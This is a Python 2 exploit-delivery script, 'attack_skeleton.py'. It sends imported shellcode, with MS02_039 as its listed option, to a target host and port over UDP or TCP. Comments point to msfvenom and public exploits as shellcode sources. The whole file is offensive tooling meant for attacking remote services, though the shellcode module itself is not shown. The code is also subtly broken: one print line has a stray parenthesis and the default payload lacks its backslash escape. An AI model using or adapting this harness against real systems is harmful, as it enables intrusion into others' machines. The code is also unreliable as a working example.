#!/usr/bin/env python2
"""
Usage:
  attack_skeleton.py    (--rhost=<rhost> --rport=<rport> --proto=<proto> --exploit=<exploit>) [--iface=<iface>]

Options:
  --rhost=<rhost>       host to attack
  --rport=<rport>       host port to attack
  --iface=<iface>       source interface
  --proto=<proto>       udp or tcp
  --exploit=<exploit>   shellcode for specific exploit must be loaded into script for your handler
Exploit Choices:
    MS02_039
"""

import subprocess
from socket import AF_INET, SOCK_DGRAM, SOCK_STREAM, socket
from docopt import docopt
from netifaces import ifaddresses

# load all of your shellcode crafter for each exploit into this file
# shellcode sources: msfvenom + reading the msf exploits works
# shellcode sources: find public exploits and piec together required byte code
from shellcode import ms02_039


def send_udp(rhost, rport, payload, iface=None):
    '''Send an exploit to a udp service'''
    print "sending payload to {} at port {}".format(rhost, rport))
    my_sock = socket(AF_INET, SOCK_DGRAM)
    if iface:
        iface_ip = ifaddresses(iface)[AF_INET][0]['addr']
        my_sock.bind((iface_ip, 0))
    my_sock.sendto(payload, (rhost, int(rport)))
    print("payload sent")

def send_tcp(rhost, rport, payload, iface=None):
    '''Send an exploit to a tcp service'''
    print("sending payload to {} at port {}".format(rhost, rport))
    soc = socket(AF_INET,SOCK_STREAM)
    soc.settimeout(2)
    if iface:
        iface_ip = ifaddresses(iface)[AF_INET][0]['addr']
        soc.bind((iface_ip, 0))
    soc.connect((rhost, int(rport)))
    soc.send(payload)
    response = soc.recv(1024)
    print(response)

def main():
    opts = docopt(__doc__)
    print(opts)
    iface = opts['--iface']
    rhost = opts['--rhost']
    rport = opts['--rport']
    proto = opts['--proto']
    exploit = opts['--exploit']
    payload = b'x41'
    try:
        if exploit.lower() == "ms02_039":
            payload = ms02_039
        if proto.lower() == "tcp":
            send_tcp(rhost=rhost, rport=rport, iface=iface, payload=payload)
        elif proto.lower() == "udp":
            send_udp(rhost=rhost, rport=rport, iface=iface, payload=payload)
        else:
            print("protocol must be either udp or tcp, not {}".format(proto))
    except Exception as ex:
        print("something broke.... blah")
        print(str(ex))

if __name__ == '__main__':
    main()
